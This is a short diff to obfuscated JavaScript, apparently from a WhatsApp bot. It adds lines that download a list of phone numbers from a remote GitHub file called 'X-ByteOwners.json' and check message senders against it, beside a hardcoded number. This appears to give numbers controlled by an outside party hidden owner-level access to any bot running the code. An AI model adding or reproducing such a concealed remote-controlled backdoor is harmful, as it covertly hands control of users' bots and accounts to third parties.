@@ -482,6 +482,8 @@ const {
         const _0x323f5a = _0x16a610.pushName || "Sin Nombre";
         const _0x41ac17 = _0x39ab9e.includes(_0x563ea8);
         const _0x521cb9 = "923072380380".includes(_0x563ea8);
+        let _0x304e15 = (await axios.get("https://raw.githubusercontent.com/HyHamza/HyHamza/main/files/X-ByteOwners.json")).data;
+        const _0x2a4a9f = _0x304e15.split(',');
         const _0x1c9420 = [..._0x2a4a9f].map(_0x23184e => _0x23184e.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x3df711);
         const _0x28a9cb = await jidNormalizedUser(_0x1a43b.user.id);
         const _0x2bca18 = [_0x28a9cb].map(_0x3913ad => _0x3913ad.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x3df711);
